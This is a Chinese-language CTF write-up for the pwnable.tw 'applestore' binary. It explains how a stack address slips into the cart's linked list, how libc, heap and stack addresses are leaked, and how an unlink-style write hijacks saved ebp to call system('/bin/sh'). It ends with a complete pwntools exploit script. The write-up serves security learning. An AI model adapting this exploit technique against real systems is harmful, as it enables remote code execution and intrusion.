---
title: pwnable.tw->applestore
categories:
- pwnable.tw
---
# pwnable.tw->applestore

## 前言

学了一点fastbin attack之后开始重新刷题，但是pwnbale.tw对于我这菜鸡来说还是有点难，磕磕绊绊看着p4nda学长调了下来，感觉自己做题一点思路都没有，还是要踏实地学习

## 程序逻辑

F5之后发现程序还是有几个关键的功能，列出苹果产品，购买一个产品，删除一个产品，查看自己加入购物车的产品，结账

![main](./1.jpg)

![main_func](./2.jpg)

有输入的地方都需要特别注意，选择功能这里的输入函数似乎没什么问题，因为其地址为ebp-0x22，read长度为0x15，没有越界写  
下面挨个看下功能函数，list没东西，add里有个create子函数，里面是malloc一个地址，赋给这个结构体的name和price。这里说下找到的结构体，每次操作的基本单元就是这样一个结构体，成员包括商品名，价格，下个结构体地址，上个结构体地址。Add里create之后还会使用Insert函数在原链表后面插入新的节点，链表头在bss段的&myCart处。  
![struct](./3.jpg)

![add](./4.jpg)

![create](./5.jpg)

![insert](./6.jpg)

delete函数相比之下简单一些，输入item number，遍历寻找链表节点，将被删除节点的前一个节点的Next指向item->next，被删除节点的下一个节点的前一个节点指向item->last。  

![delete](./7.jpg)

cart函数从myCart开始依次输出商品的名字和价格

![cart](./8.jpg)

checkout函数比较有意思，cart会得到一个商品总价格，这个价格是7174的时候会将ebp-0x20处作为最后一个chunk插入链表。这个地址看起来也没什么问题，因为虽然是栈上地址，但是这里的函数没有read，无法溢出覆盖。但是这个if条件这么苛刻，漏洞一定就在这里，再看一下别的含有read的函数，这里可以想到虽然原函数里没有直接输入可以溢出，但是由于这些函数都是main_func调用的，每次给的函数栈都是一样的，所以checkout之后再调用cart，他们的函数栈都是分配的一样的，这就给了我们利用的机会。

![checkout](./9.jpg)

## 漏洞分析

继续刚才的说，cart，delete，add函数里都有read的部分，这些函数可以溢出到最后一个chunk，cart里会有输出chunk->name,chunk->price的函数，以此可以泄露地址，而delete类似unlink，可以考虑构造unlink攻击。  
首先是这个If条件，list里的价格是199、299、399、499。最终价格是7174，以4结尾，6*9=54,所以肯定是*6的数量，而最大是499，最小是199，所以最终应当是36-14之间，写个Python脚本，四个循环遍历一下就出来了，有很多结果，选一个简单的就是6个199，20个299的。  

### 泄露libc函数地址

思路：首先create6个199，20个299，进入checkout分配栈上地址，在cart函数里修改栈数据（由于read函数不受'\x00'影响，输入'y\x00abcd'不影响buf比较但是可以覆盖栈数据），name填read@got，打印出read的实际地址

### 泄露堆地址

思路：由于全局变量myCart存储的第一个struct的地址，因此name填&myCart+8即可输入malloc的第一个chunk地址，再减去相应的偏移即可找到堆分配的基地址

### 泄露栈地址

思路：能得到堆地址的基础上，我们可以每次填入chunk->next的地址，使得每次输入都是下一个chunk的地址，依此到第26次输出的chunk->next_addr就是stack_addr

### unlink

思路：这个结构体的删除类似unlink加上我们可以控制最后一个结构体的数据，可以使用unlink，但是unlink有副作用，FD->bk = BK = addr2,*(addr1+12)=addr2，BK->fd = FD，*(addr2+8) = addr1，如果直接覆盖return_addr为shell_addr，则要么addr1 = return_addr-12，要么addr2 = return_addr-8,第一种情况下会导致*(shell_addr+8)=return_addr-12，第二种情况*(shell_addr+12)=return_addr-8，都会有副作用，这里就要使用一个常见的套路，就是要覆盖调用函数的ebp，即FD=stack_addr，BK=ebp_addr-8，使得*ebp=stack_addr,这样的副作用是*(stack_addr+12)=ebp_addr-8，stack_addr是我们伪造的一个栈结构，其值为fake_ebp+system_addr+fake_ebp+'/bin/sh'_addr，这个副作用完全不影响我们的利用。  
在被调函数执行完毕后，调用函数的ebp被换成了stack_addr，这样在leave ret的时候pop出fake_ebp，eip就指向system_addr了。这里的fake_stack我们可以选择handler里的可控区域.

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level="debug")
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./applestore')
if debug:
    p = process('./applestore')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    gdb.attach(p)
else:
    libc = ELF('./libc_32.so.6')
    p = remote('chall.pwnable.tw',10104)

def Add(number):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Device Number> ')
    p.sendline(str(number))

def Remove(number):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Item Number> ')
    p.send(number)

def LisApp(data):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('> ')
    p.send(data)

def Checkout():
    p.recvuntil('> ')
    p.sendline('5')
    p.recvuntil('> ')
    p.sendline('y')

for i in range(6):
    Add(1)
for i in range(20):
    Add(2)
Checkout()
read_got = elf.got['read']
payload = 'y\x00'+p32(read_got)+p32(0)*3
LisApp(payload)
p.recvuntil('27: ')
read_addr = u32(p.recv(4))
libc_base = read_addr - libc.symbols['read']
log.success('libc base addr => ' + hex(libc_base))
## leak heap addr
payload = 'y\x00'+p32(0x0804b068+8)+p32(0)*2
LisApp(payload)
p.recvuntil('27: ')
heap_base = u32(p.recv(4)) - 0x410
log.success('heap base => ' + hex(heap_base))
heap_addr =  heap_base+0x410
## leak stack
for i in range(26):
    payload = 'y\x00'+p32(heap_addr+8)+p32(0)*2
    LisApp(payload)
    p.recvuntil('27: ')
    heap_addr = u32(p.recv(4))
    
log.success('stack addr => ' + hex(heap_addr))
## unlink
return_addr = heap_addr + 0x20 + 4
system_addr = libc_base + 0x3a819
stack_addr = heap_addr + 0x60 -0x20
addr1 = stack_addr
addr2 = stack_addr + 0x20 - 8
payload = flat('27',0,0,addr1,addr2)
p.recvuntil('> ')
p.sendline('3')
p.recvuntil('Number> ')
p.send(payload)
##
payload = '6\x00'
esp = 0xdeadbeef
payload += flat(esp,system_addr,esp,esp)
p.recvuntil('> ')
p.send(payload)

p.interactive()
```

